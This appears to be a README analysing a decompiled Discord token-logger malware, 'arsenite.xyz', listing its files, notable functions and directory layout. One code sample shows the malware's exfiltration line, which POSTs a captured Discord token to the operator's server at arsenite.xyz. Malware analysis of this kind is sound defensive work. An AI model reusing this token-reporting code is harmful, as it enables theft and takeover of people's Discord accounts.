# arsenite.xyz discord token logger

# FILES

##### Token Discovery: arsenite/arsenite/TokenDiscovery.cs
##### Stub configuration: arsenite/arsenite/Config.cs
##### Main program: arsenite/arsenite/Program.cs

# Functions worth noting

##### gzip function: Program.cs line 15
##### report token: TokenDiscovery.cs line 103
##### check token: TokenDiscovery.cs line 64

# code samples:

##### report token

```
HttpResponseMessage result = TokenDiscovery._httpClient.PostAsync("https://arsenite.xyz/logger/" + Config.Id + "/report", new StringContent("{\"token\":\"" + token + "\"}", Encoding.UTF8, "application/json")).Result;
```

##### gzip 

```
private static byte[] GZip(byte[] compressed)
		{
			MemoryStream stream = new MemoryStream(compressed);
			GZipStream gzipStream = new GZipStream(stream, CompressionMode.Decompress);
			MemoryStream memoryStream = new MemoryStream();
			gzipStream.CopyTo(memoryStream);
			gzipStream.Close();
			return memoryStream.ToArray();
		}
```

# directory tree

```
arsenite/
├── arsenite 
│   ├── Config.cs
│   ├── Json
│   ├── Program.cs
│   ├── Properties
│   │   └── AssemblyInfo.cs
│   ├── TokenDiscovery.cs
│   ├── Update
│   ├── app.manifest
│   └── arsenite.csproj
├── arsenite.sln
└── binaries 
    ├── Update
    └── json
```
